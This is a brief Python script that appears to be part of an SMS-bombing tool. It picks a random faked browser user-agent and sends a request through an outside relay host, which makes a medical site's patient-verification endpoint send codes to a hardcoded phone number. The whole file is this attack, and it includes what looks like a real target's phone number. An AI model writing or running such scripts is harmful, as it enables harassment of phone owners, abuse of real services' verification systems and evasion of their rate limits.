import requests
import re
import random

heads = [
    {
    'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; rv:76.0)Gecko/20100101 Firefox/76.0',
    'Accept': '*/*'
    },
    {
    "User-Agent" : "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0)Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
    {
    "User-Agent" : "Mozilla/5.0 (X11; Debian; Linux X86_64; rv:72.0)Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
    {
    'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; rv:76.0)Gecko/20100101 Firefox/69.0',
    'Accept': '*/*'
    },
    {
    "User-Agent" : "Mozilla/5.0 (X11; Debian; Linux X86_64; rv:72.0)Gecko/20100101 Firefox/76.0",
    'Accept': '*/*'
    },
    {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/112.0',
    'accept': '*/*'
    },
    {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
    'accept': '*/*'
    }
]

random_head = random.choice(heads)


def send2(url_for_send, json_for_send, random_head):
    try:
        import json
        json_send = {
            "url": url_for_send,
            "user_agent": random_head,
            "data": json_for_send,
            "method": "POST"
        }
        send_att = requests.post(url="https://danyalssssssssss.cybranceehost.com/index.php", json=json_send,timeout=2.5)
        print(send_att.text)
    except Exception as e:
        if str(e) == "('Connection aborted.', RemoteDisconnected('Remote end closed connection without response'))" or "Read timed out" in str(e):
            pass
        else:
            #bot.send_message(admin_id, f"خطایی رخ داد: {e}")
            with open('backup/error.txt', 'a') as f:
                f.write(f"{e}\n")

number = "9373058966"

url_pindo = "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token"
json_pindo = {"mobile": "0" + number}


send2(url_pindo,json_pindo,random_head)  

